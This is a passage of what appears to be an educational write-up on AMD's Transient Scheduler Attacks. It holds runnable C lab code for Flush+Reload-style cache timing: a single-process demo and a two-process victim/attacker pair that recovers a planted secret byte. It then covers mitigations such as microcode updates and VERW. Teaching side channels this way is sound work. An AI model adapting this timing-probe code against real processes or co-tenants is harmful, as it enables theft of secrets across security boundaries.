<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
